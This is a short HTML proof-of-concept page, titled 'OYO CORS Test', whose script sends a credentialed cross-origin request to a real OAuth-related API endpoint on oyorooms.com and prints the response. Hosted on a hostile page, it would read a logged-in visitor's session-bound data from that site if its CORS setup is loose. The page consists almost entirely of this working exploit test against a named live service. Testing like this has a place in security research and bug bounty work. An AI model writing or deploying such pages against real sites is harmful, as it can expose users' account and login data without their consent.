<!DOCTYPE html>
<html>
<body>

<h2>OYO CORS Test</h2>

<button onclick="test()">Test</button>

<pre id="out"></pre>

<script>
async function test() {
    const out = document.getElementById("out");

    try {
        const r = await fetch(
            "https://www.oyorooms.com/api/pwa/slOauth?locale=en",
            {
                method: "GET",
                credentials: "include"
            }
        );

        const body = await r.text();

        out.textContent =
            "SUCCESS\n\n" +
            "Status: " + r.status + "\n\n" +
            body;

    } catch (e) {
        out.textContent =
            "FAILED\n\n" +
            e.name + ": " + e.message;
    }
}
</script>

</body>
</html>
